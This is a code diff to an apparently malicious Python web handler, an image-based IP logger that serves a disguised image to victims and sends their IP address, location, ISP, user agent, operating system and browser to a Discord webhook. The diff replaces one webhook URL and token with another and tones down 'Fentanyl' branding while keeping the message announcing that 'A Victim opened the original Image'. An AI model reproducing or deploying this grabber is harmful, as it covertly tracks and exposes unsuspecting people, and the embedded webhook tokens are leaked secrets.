@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1475048856508043390/SHapmBcgEzccFC6XUSiTQusDOHOJCXMaNgpBBlsSPM-qeQeP1QT3XxL88JLNcXBUEx1u'
 
 bindata = httpx.get('https://yt3.ggpht.com/wVW11wzROUn5Xxz6pDHWIvnber8DRjWupAzbsCR6VNLZiX1EiY1vdUeT8RNLhSSwwkvLkNK5xg=s600-c-k-c0x00ffffff-no-rj-rp-mo').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
@@ -10,15 +10,15 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "Bot",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "something",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "something"
       },
       "fields": [
         {
